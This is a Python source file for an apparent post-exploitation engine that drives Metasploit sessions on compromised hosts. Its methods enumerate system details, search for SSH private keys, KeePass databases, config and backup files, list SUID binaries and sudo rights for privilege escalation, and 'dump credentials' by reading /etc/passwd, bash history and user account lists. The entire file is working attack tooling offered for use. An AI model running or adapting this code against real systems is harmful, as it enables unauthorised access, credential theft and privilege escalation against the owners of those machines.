"""
Post-Exploitation Engine - ACTUAL COMMAND EXECUTION
"""
import json
import os
import re
import asyncio
from datetime import datetime
from typing import Dict, Any, List

class PostExploitEngine:
    """Actual post-exploitation that executes commands through Metasploit RPC"""
    
    def __init__(self, msf_instance):
        self.msf = msf_instance
        self.workspace_path = None
    
    def set_workspace(self, path: str):
        """Set workspace for saving results"""
        self.workspace_path = path
    
    async def _execute_in_session(self, session_id: str, command: str) -> Dict[str, Any]:
        """Execute a command in a session and return result"""
        try:
            if not hasattr(self.msf, 'run_one_post_cmd'):
                return {
                    "success": False,
                    "error": "Metasploit RPC not properly initialized",
                    "output": ""
                }
            
            result = await self.msf.run_one_post_cmd(session_id, command)
            return result
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
    
    async def gather_system_info(self, session_id: str) -> Dict[str, Any]:
        """Actually gather system info by executing commands"""
        try:
            # First verify session exists
            sessions_result = await self.msf.list_sessions()
            if not sessions_result["success"]:
                return {
                    "success": False,
                    "error": "No active sessions",
                    "summary": {"session_id": session_id, "exists": False},
                    "session_id": session_id,
                    "action": "sysinfo",
                    "timestamp": datetime.now().isoformat()
                }
            
            # Check if this session exists
            session_found = False
            if sessions_result.get("output"):
                lines = sessions_result["output"].split('\n')
                for line in lines:
                    if line.strip().startswith(session_id) or f" {session_id} " in line:
                        session_found = True
                        break
            
            if not session_found:
                return {
                    "success": False,
                    "error": f"Session {session_id} not found",
                    "summary": {"session_id": session_id, "exists": False},
                    "session_id": session_id,
                    "action": "sysinfo",
                    "timestamp": datetime.now().isoformat()
                }
            
            # Execute commands to gather info
            info = {
                "session_id": session_id,
                "exists": True,
                "commands_executed": [],
                "results": {}
            }
            
            # Try to determine OS type first
            os_type = "unknown"
            
            # Check if it's Windows
            windows_cmd = await self._execute_in_session(session_id, "systeminfo")
            if windows_cmd["success"] and windows_cmd.get("output"):
                if "Windows" in windows_cmd["output"]:
                    os_type = "windows"
                    info["results"]["System Information"] = windows_cmd["output"]
            
            # Check if it's Linux
            if os_type == "unknown":
                linux_cmd = await self._execute_in_session(session_id, "uname -a")
                if linux_cmd["success"] and linux_cmd.get("output"):
                    os_type = "linux"
                    info["results"]["Kernel Information"] = linux_cmd["output"]
            
            # Gather basic info based on OS
            if os_type == "linux":
                # Linux commands
                commands = [
                    ("whoami", "Current User"),
                    ("hostname", "Hostname"),
                    ("id", "User/Group IDs"),
                    ("cat /etc/os-release 2>/dev/null || lsb_release -a 2>/dev/null", "OS Details"),
                    ("df -h", "Disk Space"),
                    ("free -m", "Memory Usage"),
                    ("ps aux --sort=-%cpu | head -10", "Top Processes"),
                ]
            elif os_type == "windows":
                # Windows commands
                commands = [
                    ("whoami", "Current User"),
                    ("hostname", "Hostname"),
                    ("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", "OS Details"),
                    ("net config workstation", "Workstation Info"),
                    ("wmic logicaldisk get size,freespace,caption", "Disk Space"),
                    ("wmic computersystem get TotalPhysicalMemory", "Memory"),
                    ("tasklist /v | head -20", "Running Processes"),
                ]
            else:
                # Generic commands
                commands = [
                    ("whoami", "Current User"),
                    ("hostname", "Hostname"),
                ]
            
            # Execute all commands
            for cmd, description in commands:
                result = await self._execute_in_session(session_id, cmd)
                if result["success"]:
                    info["commands_executed"].append(cmd)
                    info["results"][description] = result.get("output", "")
            
            return {
                "success": True,
                "summary": info,
                "results": info["results"],  # Added for consistency
                "os_type": os_type,
                "session_id": session_id,
                "action": "sysinfo",
                "timestamp": datetime.now().isoformat(),
                "message": f"Gathered system info for session {session_id}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "session_id": session_id,
                "action": "sysinfo",
                "timestamp": datetime.now().isoformat(),
                "summary": {"session_id": session_id, "error": str(e)}
            }
    
    async def loot_sensitive_files(self, session_id: str) -> Dict[str, Any]:
        """Search for sensitive files"""
        try:
            # Determine OS first
            os_check = await self._execute_in_session(session_id, "uname -a 2>/dev/null || ver 2>/dev/null || echo unknown")
            os_type = "unknown"
            
            if os_check["success"] and os_check.get("output"):
                output = os_check["output"].lower()
                if "linux" in output or "unix" in output:
                    os_type = "linux"
                elif "windows" in output:
                    os_type = "windows"
            
            results = {}
            
            if os_type == "linux":
                # Linux sensitive file searches
                searches = [
                    ("SSH Keys", "find /home /root -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | head -20"),
                    ("Config Files", "find /etc -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -20"),
                    ("Database Files", "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | head -20"),
                    ("Password Files", "ls -la /etc/passwd /etc/shadow 2>/dev/null"),
                    ("Backup Files", "find / -name '*.bak' -o -name '*.backup' 2>/dev/null | head -20"),
                ]
            elif os_type == "windows":
                # Windows sensitive file searches
                searches = [
                    ("Documents", "dir C:\\Users\\*.txt C:\\Users\\*.doc* C:\\Users\\*.xls* /s /b 2>nul | head -20"),
                    ("Config Files", "dir C:\\*.ini C:\\*.conf C:\\*.cfg /s /b 2>nul | head -20"),
                    ("Password Files", "dir C:\\*.kdbx C:\\*.kdb /s /b 2>nul | head -20"),
                    ("Backup Files", "dir C:\\*.bak C:\\*.backup /s /b 2>nul | head -20"),
                ]
            else:
                searches = [
                    ("Basic File Search", "find / -type f -name '*.txt' -o -name '*.conf' 2>/dev/null | head -10"),
                ]
            
            # Execute searches
            for description, command in searches:
                result = await self._execute_in_session(session_id, command)
                if result["success"] and result.get("output"):
                    results[description] = result["output"]
            
            return {
                "success": True,
                "results": results,
                "os_type": os_type,
                "session_id": session_id,
                "action": "loot",
                "timestamp": datetime.now().isoformat(),
                "message": f"File looting completed for session {session_id}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "session_id": session_id,
                "action": "loot",
                "timestamp": datetime.now().isoformat(),
                "message": "Failed to loot files"
            }
    
    async def check_privesc(self, session_id: str) -> Dict[str, Any]:
        """Check for privilege escalation vectors"""
        try:
            # Determine OS
            os_check = await self._execute_in_session(session_id, "whoami /priv 2>/dev/null || echo linux")
            os_type = "linux"
            
            if os_check["success"] and os_check.get("output"):
                output = os_check["output"].lower()
                if "privilege" in output or "windows" in output:
                    os_type = "windows"
            
            results = {}
            
            if os_type == "linux":
                # Linux privilege escalation checks
                checks = [
                    ("SUID Binaries", "find / -type f -perm -4000 2>/dev/null | head -30"),
                    ("Sudo Privileges", "sudo -l 2>/dev/null"),
                    ("World Writable Files", "find / -type f -perm -o+w 2>/dev/null | head -20"),
                    ("Cron Jobs", "ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null"),
                    ("Kernel Info", "uname -a"),
                ]
            else:
                # Windows privilege escalation checks
                checks = [
                    ("User Privileges", "whoami /priv"),
                    ("Local Groups", "net localgroup"),
                    ("Administrators", "net localgroup administrators"),
                    ("System Info", "systeminfo | findstr /B /C:\"OS\" /C:\"Hotfix\""),
                    ("Patches", "wmic qfe list brief | head -20"),
                ]
            
            # Execute checks
            for description, command in checks:
                result = await self._execute_in_session(session_id, command)
                if result["success"]:
                    results[description] = result.get("output", "")
            
            return {
                "success": True,
                "results": results,
                "os_type": os_type,
                "session_id": session_id,
                "action": "privesc",
                "timestamp": datetime.now().isoformat(),
                "message": f"Privilege escalation check completed for session {session_id}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "session_id": session_id,
                "action": "privesc",
                "timestamp": datetime.now().isoformat(),
                "message": "Failed to check privilege escalation"
            }
    
    async def dump_credentials(self, session_id: str) -> Dict[str, Any]:
        """Attempt to dump credentials"""
        try:
            # Determine OS
            os_check = await self._execute_in_session(session_id, "cat /etc/passwd 2>/dev/null || echo windows")
            os_type = "windows"
            
            if os_check["success"] and os_check.get("output"):
                output = os_check["output"]
                if "root:" in output or "daemon:" in output:
                    os_type = "linux"
            
            results = {}
            
            if os_type == "linux":
                # Linux credential checks
                checks = [
                    ("Passwd File", "cat /etc/passwd"),
                    ("Shadow File", "ls -la /etc/shadow 2>/dev/null"),
                    ("History Files", "tail -50 ~/.bash_history 2>/dev/null; tail -50 /root/.bash_history 2>/dev/null"),
                    ("SSH Keys", "find /home /root -name 'id_*' -o -name 'authorized_keys' 2>/dev/null"),
                ]
            else:
                # Windows credential checks
                checks = [
                    ("Users", "net users"),
                    ("User Details", "net user %USERNAME%"),
                    ("Logged On Users", "query user"),
                    ("Shares", "net share"),
                ]
            
            # Execute checks
            for description, command in checks:
                result = await self._execute_in_session(session_id, command)
                if result["success"]:
                    results[description] = result.get("output", "")
            
            return {
                "success": True,
                "results": results,
                "os_type": os_type,
                "session_id": session_id,
                "action": "creds",
                "timestamp": datetime.now().isoformat(),
                "message": f"Credential dump completed for session {session_id}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "session_id": session_id,
                "action": "creds",
                "timestamp": datetime.now().isoformat(),
                "message": "Failed to dump credentials"
            }


# Global instance
post_exploit = None

def init_post_exploit(msf_instance):
    """Initialize the global post-exploit instance"""
    global post_exploit
    if post_exploit is None:
        post_exploit = PostExploitEngine(msf_instance)
    return post_exploit
